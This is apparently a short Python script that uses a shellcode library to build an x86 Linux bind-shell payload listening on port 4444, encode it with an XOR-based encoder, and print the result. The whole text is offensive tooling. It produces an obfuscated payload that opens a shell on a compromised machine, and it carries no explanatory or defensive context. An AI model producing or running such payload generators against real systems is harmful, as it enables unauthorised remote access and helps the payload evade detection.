from shellerate.encoder.xority import Xority
from shellerate.bind_shellcode import *
b=BindShellcode(4444, 'x86', 'linux')
b.generate()
e=Xority(b.shellcode())
print(e.payload())

